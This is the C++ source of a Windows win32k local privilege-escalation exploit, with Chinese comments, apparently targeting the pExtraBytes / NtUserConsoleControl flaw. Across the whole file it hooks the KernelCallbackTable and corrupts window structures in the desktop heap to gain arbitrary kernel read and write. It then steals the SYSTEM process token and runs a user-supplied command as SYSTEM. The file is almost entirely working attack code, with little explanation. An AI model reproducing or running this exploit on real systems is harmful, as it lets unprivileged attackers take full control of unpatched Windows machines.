// ExploitTest.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <windows.h>
#include <stdio.h>
#include<time.h>

EXTERN_C void  Int_3();

typedef void* (NTAPI* lHMValidateHandle)(HANDLE h, int type);
typedef DWORD64(NTAPI* fnxxxClientAllocWindowClassExtraBytes)(DWORD64* a1);
typedef DWORD64(NTAPI* fnNtUserConsoleControl)(int nConsoleCommand, HWND* pHwnd, int nConsoleInformationLength);
typedef DWORD64(NTAPI* fnNtCallbackReturn)(DWORD64* a1, DWORD64 a2, DWORD64 a3);
typedef DWORD64 QWORD;

#define _BYTE  uint8
#define _WORD  uint16
#define _DWORD uint32
#define _QWORD uint64

lHMValidateHandle g_pfnHmValidateHandle = NULL;
fnxxxClientAllocWindowClassExtraBytes	g_oldxxxClientAllocWindowClassExtraBytes = NULL;

QWORD g_nRandom = 0;
QWORD g_qwExpLoit = 0;
QWORD	ref_g_pMem5 = 0;
HWND g_hWndMax = 0;
QWORD	g_qwrpdesk = 0;
bool	g_bIsInit = 0;
DWORD g_pmbi_rcBar_left = 0;
DWORD g_offset_0x1 = 0;
QWORD g_qwMinBaseAddress = 0;
QWORD g_qwRegionSize = 0;
DWORD	g_Thrdeskhead_cLockobj_Min = 0;
fnNtUserConsoleControl g_pfnNtUserConsoleControl = nullptr;
fnNtCallbackReturn g_pfnNtCallbackReturn = nullptr;
BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return FALSE;
	}

	BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	g_pfnHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}


HWND GuessHwnd(QWORD* pBaseAddress, DWORD dwRegionSize)
{
	QWORD qwBaseAddressBak = *pBaseAddress;
	QWORD qwBaseAddress = *pBaseAddress;
	DWORD dwRegionSizeBak = dwRegionSize;
	HWND hwndMagicWindow = nullptr;
	do
	{
		while (*(WORD*)qwBaseAddress != g_nRandom & dwRegionSize > 0)
		{
			qwBaseAddress += 2;

			dwRegionSize--;
		}
		//获取不到才会走下面的步骤
		// 下面的代码有问题，因为并不能保证qwBaseAddress-0xc8不等于0的时候，就一定是有效的hwndMagicWindow，所以如果上面没有找到，直接失败即可
		//(-50+6)*4=-2C*4=-B0 ，c8-b0=0x18，说明ptagWNDk的0x18偏移dwStyle是0x8000000
		if (*(DWORD*)((DWORD*)qwBaseAddress + (0x18 >> 2) - (0xc8 >> 2)) != 0x8000000)
		{
			qwBaseAddress = qwBaseAddress + 4;
			QWORD qwSub = qwBaseAddressBak - qwBaseAddress;
			dwRegionSize = dwRegionSizeBak + qwSub;
		}
		hwndMagicWindow = (HWND) * (DWORD*)(qwBaseAddress - 0xc8);//qwBaseAddress现在指向cbWndExtra，减去0xc8，刚好等于hwnd
		if (hwndMagicWindow)
		{
			break;
		}

	} while (true);

	return hwndMagicWindow;
}


DWORD64  g_newxxxClientAllocWindowClassExtraBytes(DWORD64* a1)
{
	DWORD64 dwTemp = *a1;
	if (dwTemp == g_nRandom)
	{
		g_offset_0x1 = 1;
		//从最小的地址暴力搜索
		HWND hwndMagic = GuessHwnd(&g_qwMinBaseAddress, g_qwRegionSize);//找到的是magicClass的HWND
		printf("MagciHwnd==%p\r\n", hwndMagic);
		if (hwndMagic)
		{
			Int_3();
			QWORD hwndMagicWNDk = (QWORD)g_pfnHmValidateHandle(hwndMagic, 1);
			printf("MagciHwnd pExtraBytes Before NtUserConsoleControl == %x\r\n", *(DWORD*)(hwndMagicWNDk + 0x128));
			g_pfnNtUserConsoleControl(6, &hwndMagic, 0x10);
			printf("MagciHwnd pExtraBytes After NtUserConsoleControl == %x\r\n", *(DWORD*)(hwndMagicWNDk + 0x128));
			QWORD qwRet = g_Thrdeskhead_cLockobj_Min;
			g_pfnNtCallbackReturn(&qwRet, 24, 0);
		}
	}
	DWORD64 dwTest = *((PULONG64) * (a1 - 11));
	return g_oldxxxClientAllocWindowClassExtraBytes(a1);
}

LRESULT __fastcall MyWndProc(HWND a1, UINT a2, WPARAM a3, LPARAM a4)
{
	if (a2 != 2)
		return DefWindowProcW(a1, a2, a3, a4);
	PostQuitMessage(0);
	return 0;
}


QWORD	MyRead64(QWORD qwDestAddr)
{
	MENUBARINFO pmbi = {};
	pmbi.cbSize = sizeof(MENUBARINFO);
	if (g_bIsInit)
	{
	}
	else
	{
		//left,top,right,bottom
		QWORD* pTemp = (QWORD*)LocalAlloc(0x40u, 0x200u);
		memset(pTemp, 0, 0x200);
		QWORD qwBase = 0x000000400000000;
		QWORD qwAdd = 0x0000000800000008;
		for (int i = 0; i < 0x40; i++)
		{
			*(pTemp + i) = qwBase + qwAdd * i;
		}
		//*(DWORD*)(pTemp+8)是等于0x40的,即(Bytes*)pTemp+0x40
		*(QWORD*)ref_g_pMem5 = (QWORD)pTemp;
		GetMenuBarInfo(g_hWndMax, -3, 1, &pmbi);
		//*(DWORD*)ref_g_pMem5 = pTemp + 9 (就是(Bytes*)pTemp+0x48) = 0x48
		g_pmbi_rcBar_left = pmbi.rcBar.left;  // pmbi.rcBar.left等于0x40
		bool	g_bIsInit = 1;
	}
	*(QWORD*)ref_g_pMem5 = qwDestAddr - g_pmbi_rcBar_left;//初始化之后，g_pmbi_rcBar_left=0x40
	GetMenuBarInfo(g_hWndMax, -3, 1, &pmbi);
	return 	(unsigned int)pmbi.rcBar.left + ((__int64)pmbi.rcBar.top << 32);
}

int _tmain(int argc, _TCHAR* argv[])
{
	system("pause");
	//找HMValidateHandle函数，该函数返回的是指向tagWNDk的指针

	if (!FindHMValidateHandle()) {
		printf("[!] Failed to locate HmValidateHandle, exiting\n");
		return 1;
	}
	g_pfnNtUserConsoleControl = (fnNtUserConsoleControl)GetProcAddress(GetModuleHandleA("win32u.dll"), "NtUserConsoleControl");
	g_pfnNtCallbackReturn = (fnNtCallbackReturn)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCallbackReturn");

	//hook  xxxClientAllocWindowClassExtraBytes
	//获取 KernelCallbackTable gs段寄存器 0x60位置为PEB
	// PEB 偏移0x58位置为KernelCallbackTable
	DWORD64	KernelCallbackTable = *(DWORD64*)(__readgsqword(0x60u) + 0x58);
	// 0x3d8位置为函数 user32!_xxxClientAllocWindowClassExtraBytes:
	g_oldxxxClientAllocWindowClassExtraBytes = (fnxxxClientAllocWindowClassExtraBytes) * (DWORD64*)(KernelCallbackTable + 0x3D8);// 0x3d8位置为函数
	DWORD dwOldProtect;
	VirtualProtect((LPVOID)(KernelCallbackTable + 0x3D8), 0x300u, 0x40u, &dwOldProtect);
	*(DWORD64*)(KernelCallbackTable + 0x3D8) = (DWORD64)g_newxxxClientAllocWindowClassExtraBytes;
	VirtualProtect((LPVOID)(KernelCallbackTable + 0x3D8), 0x300u, dwOldProtect, &dwOldProtect);

	srand(time(0));
	g_nRandom = (rand() % 255 + 0x1234) | 1;//cbWndExtra是随机的，magicClass赋值成g_nRandom

	 //注册一个NormalClass
	WNDCLASSEXW wndClass = {};
	wndClass.lpfnWndProc = (WNDPROC)MyWndProc;
	wndClass.cbSize = 80;
	wndClass.style = 3;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 32;
	wndClass.hInstance = GetModuleHandleW(0);
	wndClass.lpszClassName = L"normalClass";
	ATOM g_lpWcxNormal = RegisterClassExW(&wndClass);
	//g_nRandom
	//注册一个magicClass
	wndClass.cbWndExtra = g_nRandom;
	wndClass.lpszClassName = L"magicClass";
	ATOM g_lpWcxMagic = RegisterClassExW(&wndClass);

	QWORD	offset_0x2c = 0x2C;
	QWORD	offset_0x28 = 0x28;
	QWORD	offset_0x40 = 0x40;
	QWORD	offset_0x44 = 0x44;
	QWORD	offset_0x58 = 0x58;
	QWORD	offset_0x128 = 0x128;
	QWORD	offset_0xc8 = 0xc8;
	QWORD	offset_0x18 = 0x18;
	QWORD	offset_0x10 = 0x10;
	QWORD	offset_0x220 = 0x220;
	QWORD	offset_0x80 = 0x80;
	QWORD	offset_0x98 = 0x98;
	QWORD	offset_0x50 = 0x50;
	QWORD	offset_0xe0 = 0xe0;

	QWORD	offset_ActiveProcessLinks = 0x2F0;//活动进程链接
	QWORD	offset_InheritedFromUniqueProcessId = 0x3E8;//进程的父PID
	QWORD	offset_Token = 0x360;//令牌
	QWORD	offset_UniqueProcessId = 0x2E8;//进程ID

	CreatePopupMenu();

	QWORD	g_pMem1 = (__int64)LocalAlloc(0x40u, 0x200u);
	QWORD	g_pMem2 = (__int64)LocalAlloc(0x40u, 0x30u);
	QWORD	g_pMem3 = (__int64)LocalAlloc(0x40u, 4u);
	QWORD	g_pMem4 = (LONG_PTR)LocalAlloc(0x40u, 0xA0u);
	HLOCAL	g_pMem5 = LocalAlloc(0x40u, 8u);

	DWORD* ref_g_pMem1 = (DWORD*)g_pMem1;

	QWORD ref_g_pMem2 = g_pMem2;
	QWORD ref_g_pMem3 = g_pMem3;
	QWORD	ref_g_pMem4 = g_pMem4;
	ref_g_pMem5 = (__int64)g_pMem5;

	*(DWORD*)(g_pMem2 + offset_0x2c) = 16;
//	*ref_g_pMem1 = 0x88888888;   //多余
	*(QWORD*)&ref_g_pMem1[2 * ((unsigned int)offset_0x28 >> 3)] = ref_g_pMem2;//g_pMem1[10-11]=g_pMem2，判断
	ref_g_pMem1[(unsigned __int64)(unsigned int)offset_0x40 >> 2] = 1;//g_pMem1[16] =1，判断
	ref_g_pMem1[(unsigned __int64)(unsigned int)offset_0x44 >> 2] = 1;//g_pMem1[17] =1，判断
	//ref_g_pMem1[22-23]=g_pMem5,就是reg_g_pMem1+0x58(0x58等于22*4)=g_pMem5
	//因为g_pMem5 = *(_QWORD *)(*(_QWORD *)g_pMem3 + 0x58i64);所以：
	*(QWORD*)&ref_g_pMem1[2 * ((unsigned __int64)(unsigned int)offset_0x58 >> 3)] = (QWORD)g_pMem5;
//	*(QWORD*)(ref_g_pMem3 + 8) = 16; //多余
	*(QWORD*)ref_g_pMem3 = (QWORD)ref_g_pMem1;
	*(QWORD*)(ref_g_pMem4 + offset_0x98) = ref_g_pMem3;
	printf("CreateWnd\r\n");
	struct _MEMORY_BASIC_INFORMATION Buffer = {};
	Buffer.BaseAddress = 0;
	Buffer.AllocationBase = 0;
	*(QWORD*)&Buffer.AllocationProtect = 0;
	Buffer.RegionSize = 0;
	*(QWORD*)&Buffer.State = 0;
	*(QWORD*)&Buffer.Type = 0;
	__int64	nIndex = 0;
	__int64 nLoop = 10;

	QWORD Thrdeskhead_cLockObj1 = 0;
	QWORD Thrdeskhead_cLockObj2 = 0;

	QWORD arrEntryDesktop[10] = {};
	HWND arrhwndNoraml[10] = {};

	do
	{
		HWND hwndNormal = CreateWindowExW(
			0x8000000u,
			(LPCWSTR)(unsigned __int16)g_lpWcxNormal,
			L"somewnd",
			0x8000000u,
			0,
			0,
			0,
			0,
			0,
			CreateMenu(),
			GetModuleHandleW(0),
			0);
		arrhwndNoraml[nIndex] = hwndNormal;
		//qwfirstEntryDesktop是tagWNDk的指针
		QWORD	qwfirstEntryDesktop = (QWORD)g_pfnHmValidateHandle(hwndNormal, 1);
		//保存的是tagWNDk的指针
		arrEntryDesktop[nIndex] = qwfirstEntryDesktop;
		printf("Hwnd:%08x   qwfirstEntryDesktop=%p\r\n", hwndNormal, qwfirstEntryDesktop);
		VirtualQuery((LPVOID)qwfirstEntryDesktop, &Buffer, 0x30u);
		printf("BaseAddress:%p   RegionSize=:%p\r\n", Buffer.BaseAddress, Buffer.RegionSize);
		if (g_qwMinBaseAddress == 0)
		{
			g_qwMinBaseAddress = (QWORD)Buffer.BaseAddress;
			g_qwRegionSize = (QWORD)Buffer.RegionSize;
		}
		else
		{
			if (g_qwMinBaseAddress < (QWORD)Buffer.BaseAddress)
			{
			}
			else
			{
				g_qwMinBaseAddress = (QWORD)Buffer.BaseAddress;
				g_qwRegionSize = (QWORD)Buffer.RegionSize;
			}
		}
		//保存最小的
		++nIndex;
		--nLoop;
	} while (nLoop);
	//在10个窗口里面，保存一个最小的基址和RegionSize
	printf("Min BaseAddress:%p   RegionSize=:%p\r\n", g_qwMinBaseAddress, g_qwRegionSize);
	//arrEntryDesktop保存的是tagWNDk的指针
	Thrdeskhead_cLockObj1 = *(DWORD*)((char*)arrEntryDesktop[0] + 8);//tagWND0的tagWNDk在桌面堆的偏移
	Thrdeskhead_cLockObj2 = *(DWORD*)((char*)arrEntryDesktop[1] + 8); //tagWND1的tagWNDk在桌面堆的偏移
	HWND hWndMin = *(HWND*)((char*)arrhwndNoraml + (Thrdeskhead_cLockObj2 < Thrdeskhead_cLockObj1 ? 8 : 0));

	int nTemp = 0;
	if (Thrdeskhead_cLockObj1 <= Thrdeskhead_cLockObj2)//取大的，是tagWND1
		nTemp = 1;
	
	//取大的，是tagWND1
	g_hWndMax = arrhwndNoraml[nTemp];
	QWORD	firstEntryDesktop_Max = arrEntryDesktop[nTemp];
	//如果tagWND1的偏移大于tagWND0,这里firstEntryDesktop_Max就等于tagWNDk1的指针
	firstEntryDesktop_Max = arrEntryDesktop[nTemp];
	//tagnWNDk0的指针
	QWORD	firstEntryDesktop_Min = *(__int64*)((char*)arrEntryDesktop + (Thrdeskhead_cLockObj2 < Thrdeskhead_cLockObj1 ? 8 : 0));
	g_Thrdeskhead_cLockobj_Min = *(DWORD*)(firstEntryDesktop_Min + 8);//tagWND0的tagWNDk在桌面堆的偏移
	DWORD	Thrdeskhead_cLockboj_Max = *(DWORD*)((char*)firstEntryDesktop_Max + 8);//tagWND1的tagWNDk在桌面堆的偏移
	for (int i = 2; i < 10; ++i)
		DestroyWindow(arrhwndNoraml[i]);
	g_pfnNtUserConsoleControl(6, &hWndMin, 0x10);
	//tagWND0的pExtraBytes，是扩展内存相对于桌面堆的偏移
	DWORD tagWndMin_offset_0x128 = *(DWORD*)(firstEntryDesktop_Min + offset_0x128);
	//tagWND1的pExtraBytes，处于直接寻址模式
	DWORD tagWndMax_offset_0x128 = *(QWORD*)(firstEntryDesktop_Max + offset_0x128);

	printf("firstEntryDesktop_Max:%p  \r\n", firstEntryDesktop_Max);
	printf("firstEntryDesktop_Min:%p  \r\n", firstEntryDesktop_Min);

	//要调用fnxxxClientAllocWindowClassExtraBytes
	HWND	g_hWndMagic = CreateWindowExW(
		0x08000000u,//dwExStyle = WS_EX_NOACTIVATE
		(LPCWSTR)(unsigned __int16)g_lpWcxMagic,
		L"somewnd",
		0x20000000u,//dwStyle = WS_MINIMIZE
		0,
		0,
		0,
		0,
		0,
		CreateMenu(),
		GetModuleHandleW(0),
		0);
	printf("realMagicHwnd=%p\n", g_hWndMagic);
	
	QWORD hwndMagicWNDk = (QWORD)g_pfnHmValidateHandle(g_hWndMagic, 1);
	printf("hwndMagicWNDk:%p  \r\n", hwndMagicWNDk);
	printf("MagciHwnd pExtraBytes After CreateWindowExW == %x\r\n", *(DWORD*)(hwndMagicWNDk + 0x128));//应该等于tagWNDk0
	//让tagWNDk0的pExtraBytes指向自己，因为tagWND2的pExtraBytes已经指向了tagWNDk0了，
	//下面0x128刚好是tagWNDk0的pExtraBytes，现在设置成指向了自己，也就是说：tagWNDk0的pExtraBytes等于g_Thrdeskhead_cLockobj_Min
	//DWORD dwRet = SetWindowLongW(g_hWndMagic, offset_0x128, g_Thrdeskhead_cLockobj_Min);
	//printf("tagWndMin before SetWindowLongW pExtraBytes  == %x\r\n", *(DWORD*)(hwndMagicWNDk + 0x128));//应该等于tagWNDk0
	Int_3();
	DWORD dwRet = SetWindowLongW(g_hWndMagic, offset_0x128, g_Thrdeskhead_cLockobj_Min);	
	printf("dwRet=%p\r\n", dwRet);
	printf("tagWndMin_offset_0x128=%p\r\n", tagWndMin_offset_0x128);
	SetWindowLongW(g_hWndMagic, offset_0xc8, 0xFFFFFFF);//将tagWNDk0的cbWndExtra赋值成0xFFFFFFF

	//WS_CHILD //ptagWNDk + 0x18指向 dwStyle，逆向时，GWLP_ID功能是ptagWNDk+0x1F，和0x18相差7个字节
	//而0x18开始的内存，刚好是：00 00 00 00 00 00 00 40 ，所以是0x4000000000000000
	//xxxSetWindowLongPtr ->xxxSetWindowData
	//把tagWND1的dwStyle赋值给g_qwrpdesk，此时g_qwrpdesk的初值不等于0x40。
	g_qwrpdesk = *(QWORD*)(firstEntryDesktop_Max + offset_0x18);
	//把tagWND1的style设置为WS_CHILD，g_Thrdeskhead_cLockobj_Min是窗口0的扩展内存偏移，Thrdeskhead_cLockboj_Max是窗口1的tagWNDk偏移
	//逆向的时候，是：桌面堆基址+pExtraBytes+index = 桌面堆基址+g_Thrdeskhead_cLockobj_Min+index
	//=桌面堆基址+g_Thrdeskhead_cLockobj_Min+Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min+offset_0x18
	//=桌面堆基址+Thrdeskhead_cLockboj_Max+offset_0x18

	SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk ^ 0x4000000000000000);
	//修改窗口 1 的 spMenu，同时泄露原 spMenu，需要WS_CHILD属性，上面已设置
	g_qwExpLoit = SetWindowLongPtrA(g_hWndMax, -12, g_pMem4);
	printf("g_qwExpLoit=%p\r\n", g_qwExpLoit);

	QWORD qwOffset = Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min;
	QWORD qwNewLong = g_qwExpLoit;
	//移除WS_CHILD属性，GetMenuBarInfo时，不能是WS_CHILD属性
	SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk);

	QWORD qwFrist = MyRead64(g_qwExpLoit + offset_0x50); 
	printf("qwFrist read=%p\r\n", qwFrist);//ptagWND
	QWORD qwSecond = MyRead64(qwFrist + offset_0x18);
	printf("qwSecond read=%p\r\n", qwSecond);//unknown
	QWORD qwThird = MyRead64(qwSecond + offset_0x80);
	printf("qwSecond read=%p\r\n", qwThird);//kernel desktop heap base
	QWORD qwFourth = MyRead64(qwFrist + offset_0x10);
	printf("qwFourth read=%p\r\n", qwFourth);//unknown
	QWORD qwFifth = MyRead64(qwFourth);//pTEB
	printf("qwFifth read=%p\r\n", qwFifth);
	QWORD qwEprocess = MyRead64(qwFifth + offset_0x220);
	printf("qwSixth read=%p\r\n", qwEprocess);//pEPROCESS
	QWORD qwEprocessBak = qwEprocess;
	DWORD dwPidSelf = GetCurrentProcessId();
	QWORD dwSystemToken = 0;
	QWORD dwMyToken = 0;
	QWORD qwMyTokenAddr = 0;

	while (!dwSystemToken || !qwMyTokenAddr)
	{
		DWORD	dwPidRead = MyRead64(qwEprocess + (unsigned int)offset_UniqueProcessId);
		if (dwPidRead == 4)
			dwSystemToken = MyRead64(qwEprocess + (unsigned int)offset_Token);
		if (dwPidRead == dwPidSelf)
			qwMyTokenAddr = qwEprocess + (unsigned int)offset_Token;
		qwEprocess = MyRead64(qwEprocess + (unsigned int)offset_ActiveProcessLinks) - (unsigned int)offset_ActiveProcessLinks;

		if (qwEprocessBak == qwEprocess)
		{
			break;
		}
	}

	//write64
	SetWindowLongPtrA(hWndMin, Thrdeskhead_cLockboj_Max + offset_0x128 - g_Thrdeskhead_cLockobj_Min, qwMyTokenAddr);
	SetWindowLongPtrA(g_hWndMax, 0, dwSystemToken);

	SECURITY_ATTRIBUTES		sa;
	HANDLE					hRead, hWrite;
	byte					buf[40960] = { 0 };
	STARTUPINFOW			si;
	PROCESS_INFORMATION		pi;
	DWORD					bytesRead;
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&sa, sizeof(sa));
	int br = 0;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return -3;
	}
	wprintf(L"[*] Trying to execute %s as SYSTEM\n", argv[1]);
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfoW(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.lpDesktop = L"WinSta0\\Default";
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	wchar_t cmd[4096] = { 0 };
	lstrcpyW(cmd, argv[1]);
	if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(hWrite);
		CloseHandle(hRead);
		printf("[!] CreateProcessW Failed![%lx]\n", GetLastError());
		return -2;
	}
	CloseHandle(hWrite);
	printf("[+] ProcessCreated with pid %d!\n", pi.dwProcessId);
	while (1)
	{
		if (!ReadFile(hRead, buf + br, 4000, &bytesRead, NULL))
			break;
		br += bytesRead;
	}
	puts("===============================");
	puts((char*)buf);
	fflush(stdout);
	fflush(stderr);
	CloseHandle(hRead);
	CloseHandle(pi.hProcess);
	//
	QWORD	tagWndMagic = (QWORD)g_pfnHmValidateHandle(g_hWndMagic, 1);
	int 	nSizeofPointer = 8;
	QWORD qwcbwndExtra = *(QWORD*)(tagWndMagic + offset_0xe0) ^ 0x80000000000;//实际想要修改E8，dwExtraFlag
	//tagWndMax的pExtra指向tagWndMagic的pExtra,看看tagWndMagic的pExtra地址
	SetWindowLongPtrA(hWndMin, offset_0x128 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, qwThird + *(unsigned int*)(nSizeofPointer + tagWndMagic) + (unsigned int)offset_0x128);
	SetWindowLongPtrA(g_hWndMax, 0, 0);//让tagWndMagic的pExtraBytes等于0
	SetWindowLongPtrA(hWndMin, offset_0x128 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, qwThird + *(unsigned int*)(nSizeofPointer + tagWndMagic) + (unsigned int)offset_0xe0);
	SetWindowLongPtrA(g_hWndMax, 0, qwcbwndExtra);//修改窗口Magic的dwExtraFlag，修改为直接寻址模式
	SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk ^ 0x4000000000000000);//修改窗口Max的WS_CHILD属性
	SetWindowLongPtrA(g_hWndMax, -12, qwNewLong);//恢复窗口Max的原始Menu
	SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk);//修改窗口Min的WS_CHILD属性
	SetWindowLongPtrA(hWndMin, offset_0x128 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, tagWndMax_offset_0x128);//修改窗口Max的pExtra指向原来的扩展内存
	SetWindowLongPtrA(hWndMin, offset_0x128, (unsigned int)tagWndMin_offset_0x128);////修改窗口Min的pExtra指向原来的扩展内存
	system("pause");
	return 0;
}